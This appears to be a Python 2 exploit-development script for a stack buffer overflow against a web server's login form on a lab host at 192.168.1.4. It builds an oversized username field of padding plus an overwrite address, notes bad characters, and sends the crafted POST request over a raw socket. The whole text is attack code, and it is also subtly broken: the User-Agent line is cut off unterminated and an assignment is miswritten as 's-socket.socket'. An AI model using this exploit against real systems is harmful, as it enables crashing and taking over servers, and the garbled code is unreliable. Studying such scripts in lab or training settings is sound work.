import socket
# badchars is "\x00\x0a\xad\x25\x26\x2b\x3d"
# Message 0x1009083
buffer='A'*780+"\x83\x0c\x09\x10"+'C'*(1500-780-4) 
payload="username="+buffer+ "&password=1234"
request=""
request+="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.1.4\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86 64; rv:68.0) Gecko/20100101 Firefox/
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n" 
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://192.168.1.4/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n" 
request+="Content-Length: "+str(len(payload))+"\r\n"
request+="Connection: keep-alive\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+= payload

print request
s-socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(("192.168.1.4",80))
s.send(request) 
print s.recv(1024)
s.close() 